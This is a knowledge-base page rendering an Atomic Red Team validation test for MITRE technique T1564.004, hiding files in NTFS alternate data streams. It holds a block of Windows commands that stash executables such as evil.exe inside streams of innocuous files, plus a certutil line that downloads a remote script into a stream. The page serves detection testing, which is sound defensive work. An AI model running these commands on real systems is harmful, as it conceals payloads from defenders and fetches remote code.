---
atomic_guid: "8822c3b0-d9f9-4daf-a043-49f4602364f4"
title: "Alternate Data Streams (ADS)"
framework: "atomic"
generated: "true"
attack_technique_id: "T1564.004"
attack_technique_name: "Hide Artifacts: NTFS File Attributes"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1564.004/T1564.004.yaml"
build_date: "2026-04-26 17:02:13"
executor: "command_prompt"
aliases:
  - "8822c3b0-d9f9-4daf-a043-49f4602364f4"
  - "Alternate Data Streams (ADS)"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Alternate Data Streams (ADS)

Execute from Alternate Streams

[Reference - 1](https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f)

[Reference - 2](https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/)

## Metadata

- Atomic GUID: 8822c3b0-d9f9-4daf-a043-49f4602364f4
- Technique: T1564.004: Hide Artifacts: NTFS File Attributes
- Platforms: windows
- Executor: command_prompt
- Elevation Required: True
- Source Path: atomics/T1564.004/T1564.004.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1564-hide_artifacts|T1564.004]]

## Input Arguments

### path

- description: Path of ADS file
- type: path
- default: c:\ADS\

## Executor

- elevation_required: True
- name: command_prompt

### Command

```cmd
type C:\temp\evil.exe > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"
extrac32 #{path}\procexp.cab #{path}\file.txt:procexp.exe
findstr /V /L W3AllLov3DonaldTrump #{path}\procexp.exe > #{path}\file.txt:procexp.exe
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\temp:ttt
makecab #{path}\autoruns.exe #{path}\cabtest.txt:autoruns.cab
print /D:#{path}\file.txt:autoruns.exe #{path}\Autoruns.exe
reg export HKLM\SOFTWARE\Microsoft\Evilreg #{path}\file.txt:evilreg.reg
regedit /E #{path}\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey
expand \\webdav\folder\file.bat #{path}\file.txt:file.bat
esentutl.exe /y #{path}\autoruns.exe /d #{path}\file.txt:autoruns.exe /o
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1564.004/T1564.004.yaml)
